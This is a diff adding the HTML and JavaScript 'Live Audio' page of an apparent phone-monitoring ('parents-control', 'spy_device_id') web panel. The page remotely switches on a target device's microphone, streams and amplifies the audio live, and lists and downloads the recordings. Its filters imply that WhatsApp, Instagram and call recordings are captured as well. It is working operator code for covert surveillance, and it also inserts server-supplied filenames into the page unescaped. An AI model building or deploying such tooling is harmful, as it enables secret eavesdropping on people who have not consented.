@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Audio</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #07070c;
+            --card: rgba(22, 27, 34, 0.92);
+            --border: rgba(255,255,255,0.08);
+            --text: #f2f4f8;
+            --muted: #8b949e;
+            --green: #30d158;
+            --red: #ff453a;
+            --orange: #ff9f0a;
+            --blue: #0a84ff;
+            --accent: #00e676;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: var(--bg);
+            background-image: radial-gradient(ellipse at top, #12121a 0%, #07070c 55%);
+            color: var(--text);
+            min-height: 100vh;
+            padding-bottom: 40px;
+        }
+
+        .header {
+            display: flex; align-items: center; gap: 12px;
+            padding: 16px 18px;
+            border-bottom: 1px solid var(--border);
+            background: rgba(7,7,12,0.85);
+            backdrop-filter: blur(10px);
+            position: sticky; top: 0; z-index: 20;
+        }
+        .back {
+            color: var(--text); text-decoration: none; font-size: 1.1rem;
+            width: 36px; height: 36px; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(255,255,255,0.05);
+        }
+        .header h1 { font-size: 1.05rem; font-weight: 600; flex: 1; }
+        .device-chip {
+            font-size: 0.72rem; color: var(--accent); font-weight: 600;
+            background: rgba(0,230,118,0.1); border: 1px solid rgba(0,230,118,0.25);
+            padding: 4px 10px; border-radius: 20px;
+        }
+
+        .wrap { max-width: 480px; margin: 0 auto; padding: 18px 16px; }
+
+        /* Mic hero */
+        .hero {
+            text-align: center; padding: 18px 0 10px;
+        }
+        .mic-ring {
+            width: 108px; height: 108px; margin: 0 auto 14px;
+            border-radius: 50%;
+            border: 2px solid rgba(0,230,118,0.35);
+            background: rgba(0,230,118,0.06);
+            display: flex; align-items: center; justify-content: center;
+            transition: 0.3s;
+            position: relative;
+        }
+        .mic-ring.listening {
+            border-color: var(--accent);
+            background: rgba(0,230,118,0.15);
+            box-shadow: 0 0 0 0 rgba(0,230,118,0.35);
+            animation: pulse-g 1.6s infinite;
+        }
+        .mic-ring.recording {
+            border-color: var(--red);
+            background: rgba(255,69,58,0.12);
+            animation: pulse-r 1.6s infinite;
+        }
+        @keyframes pulse-g {
+            0% { box-shadow: 0 0 0 0 rgba(0,230,118,0.4); }
+            70% { box-shadow: 0 0 0 22px rgba(0,230,118,0); }
+            100% { box-shadow: 0 0 0 0 rgba(0,230,118,0); }
+        }
+        @keyframes pulse-r {
+            0% { box-shadow: 0 0 0 0 rgba(255,69,58,0.4); }
+            70% { box-shadow: 0 0 0 22px rgba(255,69,58,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,69,58,0); }
+        }
+        .mic-ring i { font-size: 2.2rem; color: var(--accent); }
+        .mic-ring.recording i { color: var(--red); }
+
+        .bars {
+            display: flex; gap: 5px; height: 36px; align-items: center; justify-content: center;
+            margin-bottom: 10px;
+        }
+        .bars span {
+            width: 5px; height: 10px; border-radius: 4px;
+            background: var(--accent); opacity: 0.25; transition: height 0.12s;
+        }
+        .bars.active span { opacity: 1; }
+
+        .status-line {
+            font-family: ui-monospace, monospace;
+            font-size: 0.8rem; letter-spacing: 0.04em;
+            color: var(--muted); min-height: 1.2em;
+        }
+        .status-line.ok { color: var(--accent); }
+        .status-line.warn { color: var(--orange); }
+        .status-line.err { color: var(--red); }
+        .status-line.rec { color: var(--red); }
+
+        /* Control cards */
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 14px 14px 12px;
+            margin-top: 14px;
+        }
+        .card-title {
+            font-size: 0.72rem; font-weight: 700; letter-spacing: 0.06em;
+            text-transform: uppercase; color: var(--muted);
+            margin-bottom: 12px;
+        }
+        .btn-row {
+            display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;
+        }
+        .btn {
+            border: none; cursor: pointer;
+            padding: 11px 16px; border-radius: 24px;
+            font-weight: 600; font-size: 0.82rem;
+            display: inline-flex; align-items: center; gap: 7px;
+            transition: 0.2s; min-width: 100px; justify-content: center;
+        }
+        .btn:disabled { opacity: 0.35; cursor: not-allowed; }
+        .btn-listen {
+            background: var(--accent); color: #003d1f;
+        }
+        .btn-listen.on { box-shadow: 0 0 16px rgba(0,230,118,0.35); }
+        .btn-stop {
+            background: rgba(255,69,58,0.15); color: var(--red);
+            border: 1px solid rgba(255,69,58,0.35);
+        }
+        .btn-boost {
+            background: rgba(255,159,10,0.12); color: var(--orange);
+            border: 1px solid rgba(255,159,10,0.3);
+        }
+        .btn-boost.on {
+            background: var(--orange); color: #1a1000;
+        }
+        .btn-rec {
+            background: rgba(255,69,58,0.12); color: var(--red);
+            border: 1px solid rgba(255,69,58,0.35);
+        }
+        .btn-rec.on {
+            background: var(--red); color: #fff;
+            box-shadow: 0 0 14px rgba(255,69,58,0.4);
+        }
+        .btn-rec-stop {
+            background: rgba(255,255,255,0.08); color: #fff;
+            border: 1px solid var(--border);
+        }
+        .hint {
+            margin-top: 10px; font-size: 0.72rem; color: var(--muted);
+            text-align: center; line-height: 1.4;
+        }
+
+        /* History list under controls */
+        .list-head {
+            display: flex; align-items: center; justify-content: space-between;
+            margin: 22px 2px 10px;
+        }
+        .list-head h2 {
+            font-size: 0.92rem; font-weight: 600;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .list-head h2 i { color: var(--blue); }
+        .refresh-btn {
+            background: transparent; border: 1px solid var(--border);
+            color: var(--muted); font-size: 0.75rem; padding: 5px 10px;
+            border-radius: 10px; cursor: pointer;
+        }
+        .refresh-btn:hover { color: var(--text); border-color: #555; }
+
+        .rec-list { display: flex; flex-direction: column; gap: 10px; }
+        .rec-item {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 12px;
+        }
+        .rec-top {
+            display: flex; align-items: center; justify-content: space-between;
+            gap: 10px; margin-bottom: 8px;
+        }
+        .rec-info { display: flex; align-items: center; gap: 10px; min-width: 0; }
+        .rec-ico {
+            width: 34px; height: 34px; border-radius: 10px;
+            background: rgba(255,69,58,0.12); color: var(--red);
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+        .rec-meta h4 {
+            font-size: 0.85rem; font-weight: 600; margin: 0;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            max-width: 200px;
+        }
+        .rec-meta span { font-size: 0.7rem; color: var(--muted); }
+        .dl {
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.06); color: var(--text);
+            display: flex; align-items: center; justify-content: center;
+            text-decoration: none; flex-shrink: 0;
+        }
+        .dl:hover { background: var(--blue); }
+        .rec-item audio {
+            width: 100%; height: 34px;
+            border-radius: 18px;
+            filter: invert(1) hue-rotate(180deg); opacity: 0.85;
+        }
+        .empty {
+            text-align: center; color: var(--muted);
+            padding: 28px 12px; font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a class="back" id="backLink" href="index.html"><i class="fa-solid fa-arrow-left"></i></a>
+        <h1>Live Audio</h1>
+        <span class="device-chip" id="targetDisplay">—</span>
+    </div>
+
+    <div class="wrap">
+        <div class="hero">
+            <div class="mic-ring" id="micCircle">
+                <i class="fa-solid fa-microphone" id="micIcon"></i>
+            </div>
+            <div class="bars" id="bars">
+                <span></span><span></span><span></span><span></span><span></span>
+                <span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <div class="status-line" id="statusText">STOPPED</div>
+            <div class="status-line" id="recStatusText" style="margin-top:4px;">Recording: Idle</div>
+        </div>
+
+        <!-- Live listen -->
+        <div class="card">
+            <div class="card-title">Live Listening</div>
+            <div class="btn-row">
+                <button class="btn btn-listen" id="startBtn" onclick="connectAndListen()">
+                    <i class="fa-solid fa-play"></i> Listen
+                </button>
+                <button class="btn btn-boost" id="boostBtn" onclick="toggleBoost()">
+                    <i class="fa-solid fa-volume-high"></i> Boost
+                </button>
+                <button class="btn btn-stop" id="stopBtn" onclick="stopListen()">
+                    <i class="fa-solid fa-stop"></i> Stop
+                </button>
+            </div>
+            <div class="hint">Realtime suno — history mein save nahi hota</div>
+        </div>
+
+        <!-- File record -->
+        <div class="card">
+            <div class="card-title">Record Audio</div>
+            <div class="btn-row">
+                <button class="btn btn-rec" id="recStartBtn" onclick="startRecording()">
+                    <i class="fa-solid fa-circle"></i> Record
+                </button>
+                <button class="btn btn-rec-stop" id="recStopBtn" onclick="stopRecording()" disabled>
+                    <i class="fa-solid fa-stop"></i> Stop Record
+                </button>
+            </div>
+            <div class="hint">Stop ke baad clip neeche list mein aa jayegi</div>
+        </div>
+
+        <!-- Local list of mic recordings -->
+        <div class="list-head">
+            <h2><i class="fa-solid fa-clock-rotate-left"></i> Recorded clips</h2>
+            <button class="refresh-btn" onclick="fetchMicHistory()"><i class="fa-solid fa-rotate"></i> Refresh</button>
+        </div>
+        <div class="rec-list" id="recList">
+            <div class="empty">Abhi koi recording nahi</div>
+        </div>
+    </div>
+
+    <script>
+        // --- AUTH CHECK ---
+        (function(){
+            var t = localStorage.getItem("access_token");
+            if(!t){ window.location.href='/login'; return; }
+            try {
+                var u = JSON.parse(localStorage.getItem("user") || "{}");
+                if(!u.email){ window.location.href='/login'; }
+            } catch(e){ window.location.href='/login'; }
+        })();
+
+        const SERVER_URL = window.location.origin.includes('localhost') || window.location.protocol === 'file:'
+            ? 'https://parents-control-website1.onrender.com'
+            : window.location.origin;
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = (urlParams.get('id') || localStorage.getItem('spy_device_id') || '').toString();
+
+        let socket = null;
+        let audioContext = null;
+        let gainNode = null;
+        let nextTime = 0;
+        let isStreaming = false;
+        let isRecording = false;
+        let isBoosted = false;
+        let connectTimeout = null;
+        let micRecordings = [];
+
+        window.onload = function () {
+            if (!DEVICE_ID) {
+                document.getElementById('targetDisplay').innerText = 'NO ID';
+                setStatus('ERROR', 'err');
+                return;
+            }
+            localStorage.setItem('spy_device_id', DEVICE_ID);
+            document.getElementById('targetDisplay').innerText = DEVICE_ID;
+            document.getElementById('backLink').href = 'index.html?id=' + encodeURIComponent(DEVICE_ID);
+            setStatus('STOPPED', '');
+            fetchMicHistory();
+        };
+
+        function setStatus(text, cls) {
+            const el = document.getElementById('statusText');
+            el.innerText = text;
+            el.className = 'status-line ' + (cls || '');
+        }
+        function setRecStatus(text, cls) {
+            const el = document.getElementById('recStatusText');
+            el.innerText = text;
+            el.className = 'status-line ' + (cls || '');
+        }
+
+        // ---- LIVE LISTEN ----
+        function connectAndListen() {
+            if (!DEVICE_ID || isStreaming) return;
+
+            if (!audioContext) audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioContext.state === 'suspended') audioContext.resume();
+            if (!gainNode) {
+                gainNode = audioContext.createGain();
+                gainNode.gain.value = isBoosted ? 5 : 1;
+                gainNode.connect(audioContext.destination);
+            }
+
+            setStatus('CONNECTING…', 'warn');
+
+            if (socket) {
+                try { socket.off('audio-stream'); socket.disconnect(); } catch (e) {}
+                socket = null;
+            }
+            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+
+            if (connectTimeout) clearTimeout(connectTimeout);
+            connectTimeout = setTimeout(function () {
+                if (!isStreaming) {
+                    setStatus('ERROR', 'err');
+                    try { if (socket) socket.disconnect(); } catch (e) {}
+                    socket = null;
+                }
+            }, 15000);
+
+            socket.on('connect', function () {
+                socket.emit('join', DEVICE_ID);
+                // Send exactly one start command. The old code emitted both a
+                // Socket.IO control-event and a REST command, creating a start/stop race.
+                socket.emit('control-event', { room: DEVICE_ID, action: 'start-mic' });
+                setStatus('CONNECTED', 'ok');
+                startUIEffects();
+                isStreaming = true;
+                if (connectTimeout) { clearTimeout(connectTimeout); connectTimeout = null; }
+            });
+
+            socket.on('audio-stream', function (data) {
+                if (!isStreaming) return;
+                playPcmChunk(data);
+            });
+            socket.on('connect_error', function () {
+                setStatus('ERROR', 'err');
+                isStreaming = false;
+                stopUIEffects();
+            });
+            socket.on('disconnect', function () {
+                if (isStreaming) {
+                    isStreaming = false;
+                    setStatus('STOPPED', '');
+                    stopUIEffects();
+                }
+            });
+        }
+
+        function stopListen() {
+            isStreaming = false;
+            if (connectTimeout) { clearTimeout(connectTimeout); connectTimeout = null; }
+            if (socket) {
+                // Send exactly one stop command while the control socket is connected.
+                // If it is already gone, there is no command to duplicate or replay.
+                try {
+                    if (socket.connected) socket.emit('control-event', { room: DEVICE_ID, action: 'stop-mic' });
+                } catch (e) {}
+                try { socket.off('audio-stream'); socket.disconnect(); } catch (e) {}
+                socket = null;
+            }
+            stopUIEffects();
+            setStatus('STOPPED', '');
+            if (audioContext) nextTime = audioContext.currentTime;
+        }
+
+        // ---- RECORD ----
+        function startRecording() {
+            if (!DEVICE_ID || isRecording) return;
+            isRecording = true;
+            document.getElementById('recStartBtn').disabled = true;
+            document.getElementById('recStartBtn').classList.add('on');
+            document.getElementById('recStopBtn').disabled = false;
+            document.getElementById('micCircle').classList.add('recording');
+            setRecStatus('Recording…', 'rec');
+
+            fetch(SERVER_URL + '/api/send-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'start_live_audio' })
+            }).catch(function () {
+                setRecStatus('ERROR', 'err');
+                isRecording = false;
+                document.getElementById('recStartBtn').disabled = false;
+                document.getElementById('recStartBtn').classList.remove('on');
+                document.getElementById('recStopBtn').disabled = true;
+                document.getElementById('micCircle').classList.remove('recording');
+            });
+        }
+
+        function stopRecording() {
+            if (!isRecording) return;
+            isRecording = false;
+            document.getElementById('recStartBtn').disabled = false;
+            document.getElementById('recStartBtn').classList.remove('on');
+            document.getElementById('recStopBtn').disabled = true;
+            document.getElementById('micCircle').classList.remove('recording');
+            setRecStatus('Saving…', 'warn');
+
+            fetch(SERVER_URL + '/api/send-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: DEVICE_ID, command: 'stop_live_audio' })
+            }).then(function () {
+                setRecStatus('Saved', 'ok');
+                setTimeout(function () { setRecStatus('Recording: Idle', ''); }, 2500);
+                // refresh list after upload
+                setTimeout(fetchMicHistory, 2500);
+                setTimeout(fetchMicHistory, 6000);
+            }).catch(function () {
+                setRecStatus('ERROR', 'err');
+            });
+        }
+
+        function toggleBoost() {
+            if (!gainNode) {
+                if (!audioContext) audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                gainNode = audioContext.createGain();
+                gainNode.gain.value = 1;
+                gainNode.connect(audioContext.destination);
+            }
+            isBoosted = !isBoosted;
+            const btn = document.getElementById('boostBtn');
+            gainNode.gain.value = isBoosted ? 5 : 1;
+            if (isBoosted) btn.classList.add('on');
+            else btn.classList.remove('on');
+        }
+
+        function playPcmChunk(arrayBuffer) {
+            if (!audioContext || !gainNode) return;
+            try {
+                var int16Array;
+                if (arrayBuffer instanceof ArrayBuffer) int16Array = new Int16Array(arrayBuffer);
+                else if (ArrayBuffer.isView(arrayBuffer))
+                    int16Array = new Int16Array(arrayBuffer.buffer, arrayBuffer.byteOffset, Math.floor(arrayBuffer.byteLength / 2));
+                else if (arrayBuffer && arrayBuffer.data) int16Array = new Int16Array(arrayBuffer.data);
+                else return;
+
+                var f32 = new Float32Array(int16Array.length);
+                for (var i = 0; i < int16Array.length; i++) f32[i] = int16Array[i] / 32768;
+                var buf = audioContext.createBuffer(1, f32.length, 16000);
+                buf.getChannelData(0).set(f32);
+                var src = audioContext.createBufferSource();
+                src.buffer = buf;
+                src.connect(gainNode);
+                if (nextTime < audioContext.currentTime) nextTime = audioContext.currentTime + 0.05;
+                src.start(nextTime);
+                nextTime += src.buffer.duration;
+                animateBars();
+            } catch (e) {}
+        }
+
+        function startUIEffects() {
+            document.getElementById('micCircle').classList.add('listening');
+            document.getElementById('startBtn').classList.add('on');
+            document.getElementById('bars').classList.add('active');
+        }
+        function stopUIEffects() {
+            document.getElementById('micCircle').classList.remove('listening');
+            document.getElementById('startBtn').classList.remove('on');
+            document.getElementById('bars').classList.remove('active');
+            document.querySelectorAll('#bars span').forEach(function (b) { b.style.height = '10px'; });
+        }
+        function animateBars() {
+            document.querySelectorAll('#bars span').forEach(function (b) {
+                b.style.height = (Math.random() * 28 + 8) + 'px';
+            });
+        }
+
+        // ---- HISTORY LIST (mic / live_audio only) ----
+        function isMicFile(name) {
+            name = (name || '').toLowerCase();
+            if (name.includes('whatsapp') || name.includes('instagram')) return false;
+            if (name.includes('call') || name.includes('dialer') || name.includes('phone') || name.includes('auto_call')) return false;
+            return name.includes('live_audio') || name.includes('live audio') || name.includes('mic') || true;
+        }
+        // tighter filter: only live_audio / mic labeled
+        function isMicOnly(name) {
+            name = (name || '').toLowerCase();
+            if (name.includes('whatsapp') || name.includes('instagram')) return false;
+            if (name.includes('auto_call') || name.includes('call_ended') || name.includes('dialer')) return false;
+            return name.includes('live_audio') || name.includes('live-audio') || name.includes('live audio')
+                || name.includes('mic_') || name.endsWith('_mic') || name.includes('mic.');
+        }
+
+        function displayName(filename) {
+            if (!filename) return 'Recording';
+            var name = filename.replace(/\.[^/.]+$/, '');
+            if (/live[_ -]?audio/i.test(name)) return 'Mic Recording';
+            var parts = name.split('_');
+            if (parts.length > 1 && /^\d+$/.test(parts[parts.length - 1])) parts.pop();
+            return parts.join(' ') || 'Recording';
+        }
+
+        function renderList() {
+            var el = document.getElementById('recList');
+            if (!micRecordings.length) {
+                el.innerHTML = '<div class="empty">Abhi koi recording nahi</div>';
+                return;
+            }
+            el.innerHTML = micRecordings.map(function (r, i) {
+                return '<div class="rec-item">' +
+                    '<div class="rec-top">' +
+                        '<div class="rec-info">' +
+                            '<div class="rec-ico"><i class="fa-solid fa-microphone"></i></div>' +
+                            '<div class="rec-meta">' +
+                                '<h4>' + r.name + '</h4>' +
+                                '<span>' + r.date + ' · ' + r.time + '</span>' +
+                            '</div>' +
+                        '</div>' +
+                        '<a class="dl" href="' + r.url + '" download target="_blank" title="Download"><i class="fa-solid fa-download"></i></a>' +
+                    '</div>' +
+                    '<audio controls preload="none" crossorigin="anonymous">' +
+                        '<source src="' + r.url + '" type="audio/mp4">' +
+                    '</audio>' +
+                '</div>';
+            }).join('');
+        }
+
+        async function fetchMicHistory() {
+            if (!DEVICE_ID) return;
+            try {
+                var res = await fetch(SERVER_URL + '/api/audio-history/' + encodeURIComponent(DEVICE_ID) + '?t=' + Date.now());
+                var data = await res.json();
+                if (!Array.isArray(data)) {
+                    micRecordings = [];
+                    renderList();
+                    return;
+                }
+                micRecordings = data
+                    .filter(function (f) {
+                        var n = f.filename || f.name || f.public_id || '';
+                        return isMicOnly(n);
+                    })
+                    .map(function (f) {
+                        var d = new Date(f.created_at);
+                        var n = f.filename || f.name || f.public_id || '';
+                        return {
+                            name: displayName(n),
+                            date: isNaN(d.getTime()) ? '' : d.toLocaleDateString(),
+                            time: isNaN(d.getTime()) ? '' : d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+                            url: f.secure_url,
+                            created: isNaN(d.getTime()) ? 0 : d.getTime()
+                        };
+                    })
+                    .sort(function (a, b) { return b.created - a.created; });
+                renderList();
+            } catch (e) {
+                document.getElementById('recList').innerHTML = '<div class="empty">Connection error</div>';
+            }
+        }
+
+        // live push when new audio arrives
+        try {
+            var listSocket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+            listSocket.on('connect', function () {
+                if (DEVICE_ID) listSocket.emit('join', DEVICE_ID);
+            });
+            listSocket.on('new-audio', function (data) {
+                if (!data || data.device_id !== DEVICE_ID) return;
+                var n = data.filename || data.name || data.public_id || '';
+                if (isMicOnly(n)) setTimeout(fetchMicHistory, 800);
+            });
+        } catch (e) {}
+
+        window.addEventListener('beforeunload', function () {
+            if (isStreaming) stopListen();
+            if (isRecording) stopRecording();
+        });
+    </script>
+</body>
+</html>
